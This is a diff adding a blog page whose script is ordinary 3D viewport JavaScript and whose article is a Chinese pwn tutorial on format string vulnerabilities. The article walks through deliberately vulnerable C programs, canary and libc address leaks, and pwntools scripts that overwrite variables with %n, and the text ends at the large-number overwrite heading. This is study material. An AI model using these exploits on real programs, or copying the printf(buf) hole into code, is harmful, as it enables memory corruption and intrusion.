+  let cssRenderer = null;
+
+  function clamp(value, min, max) {
+    return Math.min(max, Math.max(min, value));
+  }
+
+  function cancelAutoMotion() {
+    state.isResetting = false;
+    state.isAnchorJumping = false;
+  }
+
+  function lerp(current, target, alpha) {
+    return current + (target - current) * alpha;
+  }
+
+  function refreshViewport() {
+    if (!state.enabled) return;
+
+    syncCamera();
+    syncBounds();
+
+    if (window.location.hash) {
+      scrollToAnchor(window.location.hash);
+      return;
+    }
+
+    ensureFrame();
+  }
+
+  function refreshWhenLayoutStable() {
+    window.requestAnimationFrame(() => {
+      window.requestAnimationFrame(() => {
+        refreshViewport();
+      });
+    });
+  }
+
+  function isWithinThreshold() {
+    return (
+      Math.abs(state.current.panY - state.target.panY) <= 0.2 &&
+      Math.abs(state.current.panX - state.target.panX) <= 0.2 &&
+      Math.abs(state.current.pitch - state.target.pitch) <= 0.0008 &&
+      Math.abs(state.current.yaw - state.target.yaw) <= 0.0008 &&
+      Math.abs(state.current.panZ - state.target.panZ) <= 0.2
+    );
+  }
+
+  function createRenderers() {
+    renderHost.replaceChildren();
+
+    cssRenderer = new CSS3DRenderer();
+    cssRenderer.domElement.className = 'three-css-layer';
+    renderHost.appendChild(cssRenderer.domElement);
+  }
+
+  function disposeRenderers() {
+    cssRenderer = null;
+    renderHost.replaceChildren();
+  }
+
+  function ensureFrame() {
+    if (!state.enabled || state.frameId) return;
+
+    state.lastTick = performance.now();
+    state.frameId = window.requestAnimationFrame(tick);
+  }
+
+  function stopFrame() {
+    if (!state.frameId) return;
+
+    window.cancelAnimationFrame(state.frameId);
+    state.frameId = 0;
+  }
+
+  function updatePanelTransform() {
+    panelObject.position.set(0, state.bounds.neutralY, 0);
+    camera.position.set(
+      -state.current.panX,
+      -state.current.panY,
+      state.current.panZ
+    );
+    camera.rotation.x = state.current.pitch;
+    camera.rotation.y = state.current.yaw;
+    updateSidebarOffset();
+  }
+
+  function updateSidebarOffset() {
+    if (!sidebarShell) return;
+
+    const offset = clamp(state.current.panY, 0, state.bounds.maxSidebarOffset);
+    if (offset === state.lastSidebarOffset) return;
+
+    state.lastSidebarOffset = offset;
+    sidebarShell.style.setProperty('--sidebar-offset', `${offset}px`);
+  }
+
+  function renderScene() {
+    if (!state.enabled || !cssRenderer) return;
+
+    updatePanelTransform();
+    cssRenderer.render(cssScene, camera);
+  }
+
+  function syncCamera() {
+    const width = window.innerWidth;
+    const height = window.innerHeight;
+
+    camera.aspect = width / height;
+    camera.fov = config.baseFov;
+    camera.updateProjectionMatrix();
+
+    cssRenderer?.setSize(width, height);
+  }
+
+  function syncBounds() {
+    const viewportWidth = window.innerWidth;
+    const viewportHeight = window.innerHeight;
+    const panelWidth = scenePlane.offsetWidth;
+    const panelHeight = scenePlane.offsetHeight;
+
+    state.bounds.neutralY = viewportHeight / 2 - panelHeight / 2 - config.topPadding;
+    state.bounds.maxPanY = Math.max(panelHeight - viewportHeight + config.topPadding + config.bottomPadding, 0);
+    state.bounds.maxPanX = Math.max((panelWidth - viewportWidth) / 2 + 300, config.defaultPanXRange);
+    state.bounds.maxSidebarOffset = sidebarShell ? Math.max(mainShell.offsetHeight - sidebarShell.offsetHeight, 0) : 0;
+
+    clampStatePair('panY', 0, state.bounds.maxPanY);
+    clampStatePair('panX', -state.bounds.maxPanX, state.bounds.maxPanX);
+    clampStatePair('panZ', config.minPanZ, config.maxPanZ);
+
+    renderScene();
+  }
+
+  function clampStatePair(key, min, max) {
+    state.target[key] = clamp(state.target[key], min, max);
+    state.current[key] = clamp(state.current[key], min, max);
+  }
+
+  function resetView(immediate, smoothReset = false) {
+    Object.assign(state.target, createViewState());
+    state.keys.clear();
+    cancelAutoMotion();
+    state.isResetting = !immediate && smoothReset;
+
+    if (immediate) {
+      Object.assign(state.current, state.target);
+      cancelAutoMotion();
+      renderScene();
+      return;
+    }
+
+    ensureFrame();
+  }
+
+  function updatePanTarget(deltaSeconds) {
+    if (!state.keys.size) return;
+    cancelAutoMotion();
+
+    let moveX = 0;
+    let moveZ = 0;
+
+    if (state.keys.has('KeyA')) moveX += 1;
+    if (state.keys.has('KeyD')) moveX -= 1;
+    if (state.keys.has('KeyW')) moveZ -= 1;
+    if (state.keys.has('KeyS')) moveZ += 1;
+
+    const speed = config.panSpeed * deltaSeconds;
+    const zSpeed = config.panZSpeed * deltaSeconds;
+
+    state.target.panX = clamp(
+      state.target.panX + moveX * speed,
+      -state.bounds.maxPanX,
+      state.bounds.maxPanX
+    );
+    state.target.panZ = clamp(
+      state.target.panZ + moveZ * zSpeed,
+      config.minPanZ,
+      config.maxPanZ
+    );
+  }
+
+  function tick(now) {
+    const deltaSeconds = Math.min((now - state.lastTick) / 1000, 0.05);
+    const activeDamping = state.isResetting
+      ? config.resetDamping
+      : (state.isAnchorJumping ? config.anchorDamping : config.damping);
+    const alpha = 1 - Math.exp(-activeDamping * deltaSeconds);
+
+    state.lastTick = now;
+    updatePanTarget(deltaSeconds);
+
+    for (const key of viewKeys) {
+      state.current[key] = lerp(state.current[key], state.target[key], alpha);
+    }
+
+    renderScene();
+
+    const stillMoving = state.keys.size > 0 || !isWithinThreshold();
+
+    if (!stillMoving) {
+      state.frameId = 0;
+      cancelAutoMotion();
+      return;
+    }
+
+    state.frameId = window.requestAnimationFrame(tick);
+  }
+
+  function getRelativeTop(node, ancestor) {
+    let current = node;
+    let top = 0;
+
+    while (current && current !== ancestor) {
+      top += current.offsetTop;
+      current = current.offsetParent;
+    }
+
+    return current === ancestor ? top : null;
+  }
+
+  function scrollToAnchor(hash) {
+    if (!hash || hash === '#') return;
+
+    const targetNode = document.getElementById(hash.slice(1));
+    if (!targetNode) return;
+    const relativeTop = getRelativeTop(targetNode, mainShell);
+    const offsetTop = relativeTop ?? 0;
+
+    state.target.panY = clamp(
+      Math.max(offsetTop - config.anchorGap, 0),
+      0,
+      state.bounds.maxPanY
+    );
+    state.isAnchorJumping = true;
+    state.isResetting = false;
+
+    ensureFrame();
+  }
+
+  function onWheel(event) {
+    if (!state.enabled) return;
+
+    cancelAutoMotion();
+    event.preventDefault();
+    state.target.panY = clamp(
+      state.target.panY + event.deltaY * config.panYSpeed,
+      0,
+      state.bounds.maxPanY
+    );
+    ensureFrame();
+  }
+
+  function releaseDrag(pointerId) {
+    if (!state.drag || (pointerId !== undefined && state.drag.pointerId !== pointerId)) return;
+
+    state.drag = null;
+    body.classList.remove('is-dragging');
+  }
+
+  function onPointerDown(event) {
+    if (!state.enabled || event.button !== 1) return;
+
+    state.drag = {
+      pointerId: event.pointerId,
+      x: event.clientX,
+      y: event.clientY
+    };
+    event.preventDefault();
+  }
+
+  function onPointerMove(event) {
+    if (!state.enabled || !state.drag || state.drag.pointerId !== event.pointerId) return;
+
+    const deltaX = event.clientX - state.drag.x;
+    const deltaY = event.clientY - state.drag.y;
+
+    state.drag.x = event.clientX;
+    state.drag.y = event.clientY;
+    cancelAutoMotion();
+    state.target.yaw = clamp(
+      state.target.yaw - deltaX * config.yawStep,
+      -config.yawLimit,
+      config.yawLimit
+    );
+    state.target.pitch = clamp(
+      state.target.pitch - deltaY * config.pitchStep,
+      -config.pitchLimit,
+      config.pitchLimit
+    );
+
+    body.classList.add('is-dragging');
+    ensureFrame();
+    event.preventDefault();
+  }
+
+  function onPointerUp(event) {
+    releaseDrag(event.pointerId);
+  }
+
+  function onKeyDown(event) {
+    if (!state.enabled) return;
+
+    if (event.code === 'Space') {
+      event.preventDefault();
+      resetView(false, true);
+      return;
+    }
+
+    if (!moveKeyPattern.test(event.code)) return;
+
+    cancelAutoMotion();
+    state.keys.add(event.code);
+    ensureFrame();
+    event.preventDefault();
+  }
+
+  function onKeyUp(event) {
+    if (!moveKeyPattern.test(event.code)) return;
+
+    state.keys.delete(event.code);
+  }
+
+  function clearScenePlaneInlineStyles() {
+    scenePlane.style.position = '';
+    scenePlane.style.left = '';
+    scenePlane.style.top = '';
+    scenePlane.style.transform = '';
+    scenePlane.style.transformOrigin = '';
+    scenePlane.style.pointerEvents = '';
+  }
+
+  function restoreDomPlane() {
+    clearScenePlaneInlineStyles();
+    if (scenePlane.parentElement === viewportShell) return;
+
+    viewportShell.appendChild(scenePlane);
+  }
+
+  function enableThree() {
+    if (state.enabled) {
+      refreshViewport();
+      return;
+    }
+
+    state.enabled = true;
+    body.classList.add('is-3d-ready');
+
+    try {
+      createRenderers();
+    } catch {
+      state.enabled = false;
+      body.classList.remove('is-3d-ready');
+      disposeRenderers();
+      restoreDomPlane();
+      return;
+    }
+
+    syncCamera();
+    syncBounds();
+    resetView(true);
+
+    if (window.location.hash) {
+      scrollToAnchor(window.location.hash);
+    } else {
+      renderScene();
+    }
+
+    refreshWhenLayoutStable();
+  }
+
+  function disableThree() {
+    state.enabled = false;
+    state.keys.clear();
+    state.lastSidebarOffset = null;
+    releaseDrag();
+    stopFrame();
+    body.classList.remove('is-3d-ready', 'is-dragging');
+    resetView(true);
+    sidebarShell?.style.removeProperty('--sidebar-offset');
+    restoreDomPlane();
+    disposeRenderers();
+  }
+
+  function syncViewportMode() {
+    if (window.innerWidth > 980 && window.innerHeight > 640) enableThree();
+    else disableThree();
+  }
+
+  viewportShell.addEventListener('wheel', onWheel, { passive: false });
+  viewportShell.addEventListener('pointerdown', onPointerDown);
+  window.addEventListener('pointermove', onPointerMove, { passive: false });
+  window.addEventListener('pointerup', onPointerUp);
+  window.addEventListener('keydown', onKeyDown);
+  window.addEventListener('keyup', onKeyUp);
+  window.addEventListener('resize', () => {
+    syncViewportMode();
+    refreshViewport();
+  });
+  window.addEventListener('load', refreshViewport, { once: true });
+  if (document.fonts?.ready) {
+    document.fonts.ready.then(() => {
+      refreshViewport();
+    });
+  }
+  document.addEventListener('click', (event) => {
+    const link = event.target.closest('a[href^="#"]');
+    if (!state.enabled || !link) return;
+
+    const href = link.getAttribute('href') || '';
+    if (!href || href === '#') return;
+
+    event.preventDefault();
+    history.pushState(null, '', href);
+    scrollToAnchor(href);
+  });
+
+  syncViewportMode();
+}
+</script>
+</head>
+<body>
+  <div class="viewport-shell">
+    <div class="three-shell"></div>
+    <div class="scene-plane">
+      <main class="main-shell">
+        <section class="content-shell">
+          <header class="header-shell">
+  <p class="eyebrow">2026-04-08</p>
+  <div class="title-row">
+    <h1 class="page-title">PWN(2)</h1>
+  </div>
+  <nav class="global-nav" aria-label="Navigation"><a class="nav-link" href="../index.html">index</a><a class="nav-link" href="../tags/index.html">tags</a><a class="nav-link" href="../categories/index.html">categories</a><a class="nav-link" href="../about/index.html">about</a></nav>
+</header>
+
+          <article class="article-shell markdown-content"><p>上一章中讲了栈溢出，我们发现大多数时候的攻击，要求我们知道/泄露出某个关键部分的地址，以掌握一定的内存布局和关键的注入点。为了更好的泄露内存信息，我们需要学习一个关键漏洞——字符串格式化漏洞。</p>
+<h2 id="格式化字符串漏洞">格式化字符串漏洞</h2>
+<blockquote>
+<p>当程序使用不安全的格式化函数（如<code>printf</code>、<code>sprintf</code>、<code>fprintf</code>等）时，攻击者可以通过控制格式化字符串参数来读取或写入任意内存地址。</p>
+</blockquote>
+<h3 id="格式化字符串函数">格式化字符串函数</h3>
+<p>在了解什么是格式化字符串漏洞之前我们首先需要清楚什么是格式化字符和格式化字符串函数。</p>
+<p>格式化字符串函数可以接受可变数量的参数，并将<strong>第一个参数作为格式化字符串</strong>，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来<strong>输出信息，调试程序，或者处理字符串</strong>。一般来说，格式化字符串在利用的时候主要分为三个部分</p>
+<ul>
+<li>格式化字符串函数</li>
+<li>格式化字符串</li>
+<li>后续参数，<strong>可选</strong></li>
+</ul>
+<p><code>printf</code>就是典型的格式化字符串函数：</p>
+<pre class="line-numbers language-c" data-language="C"><code class="language-c">int printf(const char *format, ...);
+// format -&gt; 格式化字符串
+// ... -&gt; 可变参数 表示可以接受任意数量、任意类型的额外参数
+</code></pre>
+<p>关于printf的用法，这个可以不用过多说明，其他类似的函数也有很多…</p>
+<h4 id="格式化字符串">格式化字符串</h4>
+<p>现在我们就需要进一步的解释格式化的的字符串，其基本格式如下：</p>
+<pre class="line-numbers language-c" data-language="C"><code class="language-c">%[parameter][flags][field width][.precision][length]type
+</code></pre>
+<p>简单解释一下：(<code>%</code>是格式化说明符的起始标志)</p>
+<ul>
+<li><code>[parameter]:</code>参数编号<code>n$</code>，用于显式指定使用第几个参数</li>
+<li><code>[flags]:</code>用于调整输出的对齐方式、符号显示等。自己搜</li>
+<li><code>[field width]:</code>指定输出的最小宽度，宽度不够会用0填充</li>
+<li><code>[.precision]:</code>用来指定精度，含义取决于<code>type</code></li>
+<li><code>[length]:</code>指定参数的长度（决定输出的数据大小）。这个等下会用到比较多</li>
+<li><code>[type]:</code>用来指定参数类型（决定输出的数据的格式）</li>
+</ul>
+<p>我们还需要认识一些特殊的格式符：</p>
+<ul>
+<li><code>%p</code>：按指针地址的格式输出地址</li>
+<li><code>%n</code>：将已输出字符数写入指定地址</li>
+</ul>
+<p>现在我们可以进一步的探索<code>printf</code>的本质了：</p>
+<h4 id="printf函数运行机理">printf函数运行机理</h4>
+<p>伪代码演示一下<code>printf</code>的原理：</p>
+<pre class="line-numbers language-c" data-language="C"><code class="language-c">int printf(const char *format, ...){
+    va_list args;			// 声明一个可变参数列表的指针(va_list是可变参数类型)
+    va_start(args,format);	 // args指向第一个可变参数（format）
+    ...
+    // 接下这里会遍历格式化字符
+    // 关键在于对length的处理
+    // va_args控制可变参数指针每次弹出大小为多少的数据
+    switch (length_modifier) {
+    	case LEN_HH: int_val = (signed char)va_arg(args, int); break;
+        case LEN_H:  int_val = (short)va_arg(args, int); break;
+        case LEN_L:  int_val = va_arg(args, long); break;
+        case LEN_LL: int_val = va_arg(args, long long); break;
+        case LEN_Z:  int_val = va_arg(args, size_t); break;
+        default:     int_val = va_arg(args, int); break;
+    }
+    ...
+    va_end(args);
+}
+</code></pre>
+<p>关键在于<code>va_args</code>函数，使用它需要提供一个数据类型作为参数，此时<code>args</code>指针会从栈上弹出一个指定数据类型的数据。在这个过程中<code>printf</code>函数对格式化字符是无条件信任的，它认为栈上确实有足够多的数据供格式化字符串读取，这就导致在某些情况下，栈上的数据会被泄露出来。</p>
+<h4 id="演示">演示</h4>
+<pre class="line-numbers language-c" data-language="C"><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(){
+    printf(&quot;%p %p %p\n&quot;);
+    return 0;
+}
+</code></pre>
+<p>编译<code>gcc -m32 -O0 printf.c</code>执行调试这个程序得到：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">&gt; ./a.out
+(nil) (nil) 0x566141a1
+</code></pre>
+<p>我们没有给格式化字符串提供参数，可还是输出了数值。这些值来自于栈上，但是具体有什么含义我们之后再来讨论。</p>
+<h3 id="格式化字符串漏洞利用">格式化字符串漏洞利用</h3>
+<blockquote>
+<p>依旧是基于32bit的编译环境</p>
+</blockquote>
+<p>解释了格式化字符串漏洞之后，我们将进一步演示怎么去利用这个漏洞达到一些目的：</p>
+<h4 id="程序崩溃">程序崩溃</h4>
+<p>这个是最简单的利用方式，我们只需要输入若干个<code>%s</code>即可：</p>
+<pre class="line-numbers language-C" data-language="C"><code class="language-C">%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+</code></pre>
+<p>现在有以下程序，编译执行<code>gcc printf.c -g -O0 -m32 -Wno-implicit-function-declaration</code>：</p>
+<pre class="line-numbers language-c" data-language="C"><code class="language-c">#include &lt;stdio.h&gt;
+int main(){
+    char buf[64];
+    gets(buf);
+    printf(buf);
+    return 0;
+}
+</code></pre>
+<p>可以看到这里有一个格式化字符串的漏洞，我们可以使其崩溃：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">&gt; ./a.out
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s
+fish: Job 1, './a.out' terminated by signal SIGSEGV (Address boundary error)
+</code></pre>
+<p>这是因为<code>%s</code>的作用是将一个数据作为指向字符串的地址，不断读取直到<code>\0</code>，结束输出字符串，基于这个特定点，所以其他的格式符没有这样的效果。但是栈上的地址不可能都是有效的地址，可能有的地址是未加载的虚拟地址 ，或者是未对齐的地址…</p>
+<p>这样我们就成功利用格式化字符串漏洞实现了程序崩溃。</p>
+<h4 id="泄露内存">泄露内存</h4>
+<p>利用格式化字符串漏洞 我们可以获取我们想要的内容，一般有以下情况：</p>
+<ul>
+<li>泄露栈内存
+<ul>
+<li>获取某个变量的值（Canary…）</li>
+<li>获取某个变量存储的地址内存（bss段入口…）</li>
+</ul>
+</li>
+<li>泄露地址内存
+<ul>
+<li>利用GOT表得到libc函数地址</li>
+<li>dump大量内存，获取信息</li>
+</ul>
+</li>
+</ul>
+<p>接下就是围绕这几种利用来进行格式化字符串漏洞展示：</p>
+<h5 id="泄露canary">泄露Canary</h5>
+<p>我们使用以下程序作为测试代码：</p>
+<pre class="line-numbers language-c" data-language="C"><code class="language-c">#include &lt;stdio.h&gt;
+
+int main(){
+    char buf[64];
+    gets(buf);
+    printf(buf);
+    return 0;
+}
+</code></pre>
+<p>然后开启栈保护编译<code>gcc printf.c -g -O0 -m32 -Wno-implicit-function-declaration -fstack-protector</code>，确实可以检测到栈溢出保护是开启的：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">&gt; pwn checksec a.out
+[*] '/home/Ylin/PWN/a.out'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+    Debuginfo:  Yes
+
+&gt; ./a.out
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+*** stack smashing detected ***: terminated
+fish: Job 1, './a.out' terminated by signal SIGABRT (Abort)
+</code></pre>
+<p>但是我们可以利用<code>canary</code>值设置的位置的特点来计算出<code>canary</code>值的位置，从而利用<code>%k$p</code>的方式直接将其泄露出来。不过首先需要泄露出缓冲区的入口的偏移值，这样才能根据缓冲区的大小计算出<code>cananry</code>的布局。我们输入：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">&gt; ./a.out
+AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p
+AAAA.0x1.0xf7f95bf0.0x566381c4.(nil).0xffc1812b.0x2.0x41414141.0x2e70252e.0x252e7025¶ 
+</code></pre>
+<p>看到AAAA的ASCII值<code>0x41414141</code>出现在栈上的第七个参数(忽略第一个格式化字符串)，现在我们可以根据栈的结构来计算canary的位置了：<eq><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>23</mn><mo>=</mo><mn>7</mn><mo>+</mo><mfrac><mn>64</mn><mn>4</mn></mfrac></mrow><annotation encoding="application/x-tex">23 = 7 + \frac{64}{4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">23</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1901em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8451em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">64</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></eq> (这里的64是刚好栈对齐的情况，平时也要考虑)</p>
+<pre class="line-numbers language-c" data-language="C"><code class="language-c">高地址
+      ┌─────────────────────┐
+      │      ...            │
+      ├─────────────────────┤
+      │   返回地址 (ret)     │  &lt;- 第?个参数
+      ├─────────────────────┤
+      │   Saved EBP         │  &lt;- 第?个参数
+      ├─────────────────────┤
+      │   CANARY(4字节)     │  &lt;- 第23个参数 (64字节后)
+      ├─────────────────────┤
+      │   缓冲区(buf[64])   │
+      │   ┌───────────────┐ │
+      │   │  buf[60-63]   │ │  &lt;- 第22个参数
+      │   ├───────────────┤ │
+      │   │  buf[56-59]   │ │  &lt;- 第21个参数
+      │   ├───────────────┤ │
+      │   │     ...       │ │
+      │   ├───────────────┤ │
+      │   │  buf[4-7]     │ │  &lt;- 第8个参数
+      │   ├───────────────┤ │
+      │   │  buf[0-3]     │ │  &lt;- 第7个参数 (0x41414141)
+      │   └───────────────┘ │
+      └─────────────────────┘
+低地址
+</code></pre>
+<p>现在可以直接通过<code>%23$p</code>泄露canary了，我们在<code>pdb</code>中进行验证：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">pwndbg&gt; canary
+AT_RANDOM  = 0xffffce9b # points to global canary seed value
+TLS Canary = 0xf7fc0514 # address where canary is stored
+Canary     = 0xb5e05400 (may be incorrect on != glibc)
+Thread 1: Found valid canaries.
+00:0000│-31c 0xffffc96c ◂— 0xb5e05400
+Additional results hidden. Use --all to see them.
+pwndbg&gt; c
+Continuing.
+%23$p
+0xb5e05400[Inferior 1 (process 19057) exited normally]
+</code></pre>
+<h5 id="泄露函数地址">泄露函数地址</h5>
+<p><code>%p</code>可以将数据泄露，而<code>%s</code>可以将数据视作指向字符串的指针，通过这个特点，我们不仅可以通过访问无效地址让程序崩溃，当我们想要访问某个地址上的内容时，我们也可以利用格式化字符串漏洞去实现。</p>
+<p>而这就引出了格式化漏洞的一个关键利用——泄露函数<code>libc</code>地址，从而绕过<code>ASLR</code>的限制。我们可以通过以下方式来获取某个指定地址<code>addr</code>中的内容：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">[addr] %[offset]$s  # offset是缓冲区的偏移值
+</code></pre>
+<p>现在我们对上面的同一个例子，编译执行<code>gcc printf.c -g -O0 -m32 -Wno-implicit-function-declaration -no-pie</code>后利用格式化字符串漏洞来泄露<code>printf</code>的libc地址：</p>
+<pre class="line-numbers language-py" data-language="PY"><code class="language-py">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./a.out')
+elf = ELF('./a.out')
+
+printf_got = elf.got['printf']
+print(hex(printf_got))
+
+# 这个4是通过[tag].%p.%p.%p...的方法泄露出来的
+payload = p32(printf_got) + b'%4$s'
+p.sendline(payload)
+
+raw = p.recvline()
+printf_addr = hex(u32(raw[4:8]))
+print(printf_addr)
+</code></pre>
+<p>成功泄露出了printf的libc地址：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">&gt; python3 exp.py
+[+] Starting local process './a.out': pid 16986
+[*] '/home/Ylin/PWN/a.out'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+    Debuginfo:  Yes
+0x804c004
+[!] EOFError during recvline. Returning buffered data without trailing newline.
+0xf7d4ae50
+[*] Process './a.out' stopped with exit code 0 (pid 16986)
+</code></pre>
+<h4 id="覆盖内存">覆盖内存</h4>
+<p>刚刚讲的都是怎么利用格式化字符串漏洞来泄露数据，现在我们可以进一步学习怎么利用格式化字符漏洞来覆盖/修改内存。只要指定的地址是可写的，我们就可以利用格式化字符串来修改其对应的数值，而核心就在于：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">%n # 不输出字符 但是把已经输入的字符个数写入对应的整型指针参数所指的变量
+</code></pre>
+<p>通过这个类型参数，我们可以通过以下方式来覆盖地址上的数值：</p>
+<ul>
+<li>确定覆盖地址<code>addr</code></li>
+<li>确定相对偏移<code>offset</code></li>
+<li>覆盖</li>
+</ul>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">[addr]%0kd%[offset]$n	# 覆盖后的数值就是k+4(32bit)
+</code></pre>
+<p>我们通常通过这个方法来修改变量的值，从而绕过程序中对某些关键变量的条件判断。但是根据变量在内存中的位置分布不同和要覆盖的数据的大小不同，我们可以分为以下几种情况：</p>
+<ul>
+<li>栈变量覆盖</li>
+<li>小数字覆盖</li>
+<li>大数字覆盖</li>
+</ul>
+<p>我们用下面这个程序来进行演示：</p>
+<pre class="line-numbers language-c" data-language="C"><code class="language-c">#include &lt;stdio.h&gt;
+int a = 123, b = 456;
+int main() {
+  int c = 789;
+  char s[100];
+  // 这里为了方便就直接输出了几个变量的地址
+  printf(&quot;%p.%p.%p\n&quot;, &amp;a, &amp;b, &amp;c); 
+  scanf(&quot;%s&quot;, s);
+  printf(s);
+  if (c == 16) {
+    puts(&quot;modified c.&quot;);
+  } else if (a == 2) {
+    puts(&quot;modified a for a small number.&quot;);
+  } else if (b == 0x12345678) {
+    puts(&quot;modified b for a big number!&quot;);
+  }
+  return 0;
+}
+</code></pre>
+<p>通过<code>gcc printf.c -g -O0 -m32 -Wno-implicit-function-declaration -no-pie</code>进行编译。</p>
+<h5 id="栈变量覆盖">栈变量覆盖</h5>
+<p>首先我们需要确定缓冲区的相对偏移为<code>offset = 6</code>：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">&gt; ./a.out
+0x804c018.0x804c01c.0xff9bef8c
+AAAA.%p.%p.%p.%p.%p.%p.%p.%p
+AAAAA.0xff9bef28.0x804c01c.0xff9bef8c.0xf7f5dd5c.0x1.0x41414141.0x70252e41.0x2e70252e¶  
+</code></pre>
+<p>然后我们就可以构造payload了，将<code>c</code>覆盖为我们想要的数值：</p>
+<pre class="line-numbers language-py" data-language="PY"><code class="language-py">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./a.out')
+elf = ELF('./a.out')
+
+var = p.recv().split(b'.')
+a,b,c = int(var[0], 16), int(var[1], 16), int(var[2], 16)
+
+payload = p32(c) + b'%012d' + b'%6$n'
+
+p.sendline(payload)
+print(p.recv())
+</code></pre>
+<p>执行发现输出中的回显<code>modified c.</code>，说明我们成功的控制了<code>c</code>的值：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">&gt; python3 exp.py
+[+] Starting local process './a.out': pid 24515
+[*] '/home/Ylin/PWN/a.out'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+    Debuginfo:  Yes
+b'\xac\x9c\xe4\xff-00001795000modified c.\n'
+[*] Process './a.out' stopped with exit code 0 (pid 24515)
+</code></pre>
+<h5 id="小数字覆盖">小数字覆盖</h5>
+<p>当我们使用<code>[addr] + %[offset]$n</code>的方式进行覆盖的时候，因为地址的大小是4字节，所以我们只能覆盖数值大于等于4的数据到指定的地址上。</p>
+<p>可是当我们想要写入一个小数字的时候我们应该怎么办呢？我们可以将字符串向后挪，在<code>%n</code>之前少放点东西：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">[padding]%[offset]$n...[addr]	# 这里的...代表需要填充一些内容从而对齐栈结构 方便计算offset
+</code></pre>
+<p>假如我们想要通过覆盖变量，从而执行上面的<code>a</code>分支，我们可以构造出以下<code>payload</code>:</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">aa%8$naa[addr]
+</code></pre>
+<p>为什么<code>offset</code>变成了8呢，接下来分别解析<code>padding</code>和<code>offset</code>的构造：</p>
+<ul>
+<li><code>padding</code>：因为我们希望写入的数据是2所以<code>%n</code>前面需要有两个字节</li>
+<li><code>offset</code>：我们知道一开始写入的相对偏移是<code>6</code>，但是这里首次写入的4个字节不是地址，而是<code>aa%8</code>。因为格式化字符串是在栈上按ASCII存储的，且32位的栈是四字节对齐的，所以需要在<code>$n</code>后再填充两个字节<code>$naa</code>这样就保证栈是对齐的了，此时<code>addr</code>前已经有八个字节，因此在栈上看，地址的偏移值应该是<code>8</code></li>
+</ul>
+<p>我们通过构造exp来验证：</p>
+<pre class="line-numbers language-py" data-language="PY"><code class="language-py">#!/usr/bin/env python3
+from pwn import *
+
+p = process('./a.out')
+elf = ELF('./a.out')
+
+var = p.recv().split(b'.')
+a,b,c = int(var[0], 16), int(var[1], 16), int(var[2], 16)
+
+payload = b'aa%8$nxx' + p32(a)
+
+p.sendline(payload)
+print(p.recv())
+</code></pre>
+<p>根据运行结果可以发现，确实成功修改了<code>a</code>的值，成功进入了指定分支：</p>
+<pre class="line-numbers language-sh" data-language="SH"><code class="language-sh">&gt; python3 exp.py
+[+] Starting local process './a.out': pid 5980
+[*] '/home/Ylin/PWN/a.out'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x8048000)
+    Stripped:   No
+    Debuginfo:  Yes
+b'aaxx\x18\xc0\x04\x08modified a for a small number.\n'
+[*] Process './a.out' stopped with exit code 0 (pid 5980)
+</code></pre>
+<h5 id="大数字覆盖">大数字覆盖</h5>
